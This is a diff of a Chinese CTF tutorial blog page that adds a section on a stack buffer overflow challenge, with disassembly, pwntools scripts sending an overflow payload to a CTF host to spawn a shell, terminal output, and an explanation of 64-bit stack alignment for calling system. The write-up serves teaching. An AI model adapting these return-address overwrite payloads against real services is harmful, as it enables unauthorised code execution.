@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412302228606.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412302333983.png">
 <meta property="article:published_time" content="2024-12-27T02:38:09.000Z">
-<meta property="article:modified_time" content="2024-12-30T15:50:25.646Z">
+<meta property="article:modified_time" content="2024-12-31T10:25:08.078Z">
 <meta property="article:author" content="QYQS">
 <meta property="article:tag" content="二进制">
 <meta property="article:tag" content="伪教程">
@@ -229,7 +229,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.1k 字
+          3.5k 字
         
       </span>
     
@@ -240,7 +240,7 @@
         
         
         
-          27 分钟
+          30 分钟
         
       </span>
     
@@ -459,6 +459,28 @@
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span>=remote(<span class="hljs-string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="hljs-number">47014</span>)<br><span class="hljs-keyword">a</span>.recvline()<br>payload=b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">12</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x40073D</span>)<br><span class="hljs-keyword">a</span>.sendline(payload)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
 
 <p>a.interactive()来获取交互 因为此时你已经打开了一个shell  你就能得到flag了</p>
+<p>这个时候如果有细心的朋友会发现为什么我的返回地址似乎有些问题</p>
+<p>此时的key函数汇编状态下是这样的:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span>                               <span class="hljs-meta">public</span> key<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span>                               key proc <span class="hljs-built_in">near</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span>                               <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400728</span> <span class="hljs-number">55</span>                            <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400729</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> E5                      <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span>000000000040072C <span class="hljs-number">48</span> <span class="hljs-number">8D</span> <span class="hljs-number">3D</span> <span class="hljs-number">15</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, format                     <span class="hljs-comment">; &quot;yes,yes,this is key.you can catch me?&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400733</span> B8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400738</span> E8 <span class="hljs-number">73</span> FE FF FF                <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400738</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040073D</span> <span class="hljs-number">48</span> <span class="hljs-number">8D</span> <span class="hljs-number">3D</span> 2A <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, command                    <span class="hljs-comment">; &quot;/bin/sh&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400744</span> E8 <span class="hljs-number">57</span> FE FF FF                <span class="hljs-keyword">call</span>    _system<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400744</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400749</span> B8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000040074E <span class="hljs-number">5D</span>                            <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040074F C3                            <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>000000000040074F                               <span class="hljs-comment">; &#125; // starts at 400728</span><br><span class="hljs-symbol">.text:</span>000000000040074F<br><span class="hljs-symbol">.text:</span>000000000040074F                               key endp<br></code></pre></td></tr></table></figure>
+
+<p>为什么我的返回地址是0x40073D而不是开头的0x400728</p>
+<p>那我们来做个实验:</p>
+<p>使用以下脚本</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span>=remote(<span class="hljs-string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="hljs-number">47014</span>)<br><span class="hljs-keyword">a</span>.recvline()<br>payload=b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">12</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x400728</span>)<br><span class="hljs-keyword">a</span>.sendline(payload)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>但是却没有打开shell</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">kali@kali-VMware-Virtual-Platform:~/桌面$ <span class="hljs-keyword">python3</span> expload.<span class="hljs-keyword">py</span> <br>[+] Opening connection <span class="hljs-keyword">to</span> nc1.ctfplus.<span class="hljs-keyword">cn</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">46975</span>: Done<br>[*] Switching <span class="hljs-keyword">to</span> interactive <span class="hljs-keyword">mode</span><br>hello,aaaaaaaaaaaaaaaaaaaa(\x07@<br>Do you know key?[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br>$ <span class="hljs-keyword">ls</span><br>$<br></code></pre></td></tr></table></figure>
+
+<p>根据观察发现提示了我们<strong>Got EOF while reading in interactive</strong></p>
+<p>直接结束了交互</p>
+<p>那如果我们改成0x400729呢</p>
+<p>再试:</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">kali@kali-VMware-Virtual-Platform:~/桌面$ <span class="hljs-keyword">python3</span> expload.<span class="hljs-keyword">py</span> <br>[+] Opening connection <span class="hljs-keyword">to</span> nc1.ctfplus.<span class="hljs-keyword">cn</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">46975</span>: Done<br>[*] Switching <span class="hljs-keyword">to</span> interactive <span class="hljs-keyword">mode</span><br>hello,aaaaaaaaaaaaaaaaaaaa)\x07@<br>Do you know key?yes,yes,this <span class="hljs-keyword">is</span> key.you can <span class="hljs-keyword">catch</span> <span class="hljs-keyword">me</span>?$ <span class="hljs-keyword">ls</span><br>bin<br>flag<br>ld-linux-x86-<span class="hljs-number">64</span>.<span class="hljs-keyword">so</span>.<span class="hljs-number">2</span><br>lib<br>lib32<br>lib64<br>libc.<span class="hljs-keyword">so</span>.<span class="hljs-number">6</span><br>stackover<br></code></pre></td></tr></table></figure>
+
+<p>成功了</p>
+<p>这里就涉及到了ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</p>
+<p>简单来说就是在此版本以上的64位程序调用system函数时  会有一条指令叫做movaps指令，这个指令要求内存地址必须16字节对齐</p>
+<p>所以当你遇到这个问题时  请尝试在你的返回地址后面+1  原理请移步基础知识标签下的”栈基础”文章查阅</p>
 <p>(未完待续….)</p>
 
                 
